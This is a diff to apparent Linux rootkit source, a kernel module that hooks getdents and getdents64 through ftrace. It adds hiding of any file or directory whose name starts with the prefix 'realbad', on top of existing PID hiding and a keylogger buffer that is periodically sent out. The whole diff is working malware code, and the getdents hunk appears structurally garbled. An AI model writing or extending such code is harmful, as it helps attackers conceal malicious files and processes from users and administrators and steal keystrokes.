@@ -33,7 +33,7 @@
 #include <linux/version.h>
 #include "ftracehelper.h"
 
-// for process
+// for process/file hiding
 #include <linux/dirent.h>
 
 #define DEBUG 0
@@ -47,7 +47,7 @@
 #define EXPIRE_TIME 10 // every EXPIRE_TIME seconds, send key_buf
 
 #define BUF_SIZE 16
-
+#define PREFIX "realbad"
 
 static char key_buf[BUF_SIZE];
 static unsigned int key_buf_ptr;
@@ -324,6 +324,20 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
              * the contents, the current directory is subsumed into that of whatever preceeds it. */
             previous_dir->d_reclen += current_dir->d_reclen;
         }
+        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
+        {
+            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
+            if ( current_dir == dirent_ker )
+            {
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+            /* This is the crucial step: we add the length of the current directory to that of the 
+             * previous one. This means that when the directory structure is looped over to print/search
+             * the contents, the current directory is subsumed into that of whatever preceeds it. */
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }
         else
         {
             /* If we end up here, then we didn't find hide_pid in current_dir->d_name 
@@ -399,6 +413,20 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
         if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
         {
             /* If hide_pid is contained in the first struct in the list, then we have to shift everything else up by it's size */
+            if ( current_dir == dirent_ker )
+            {
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+            /* This is the crucial step: we add the length of the current directory to that of the 
+             * previous one. This means that when the directory structure is looped over to print/search
+             * the contents, the current directory is subsumed into that of whatever preceeds it. */
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }
+        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
+        {
+            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
             if ( current_dir == dirent_ker )
             {
                 ret -= current_dir->d_reclen;
